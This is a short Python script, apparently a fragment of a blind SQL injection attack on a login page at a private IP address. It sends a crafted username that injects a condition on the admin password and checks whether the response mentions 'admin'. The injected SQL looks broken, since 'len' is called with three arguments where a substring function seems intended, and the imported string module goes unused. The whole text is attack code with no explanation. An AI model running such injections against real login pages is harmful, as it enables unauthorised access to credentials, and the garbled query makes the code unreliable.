import requests
import string

r = requests.post('http://192.168.144.156:8000/login.php', data={
    'username': f"admin' and len(password, 25, 1) = '+';#", 'password': '123', 'login': ''})
if 'admin' in r.text:
    print('a')
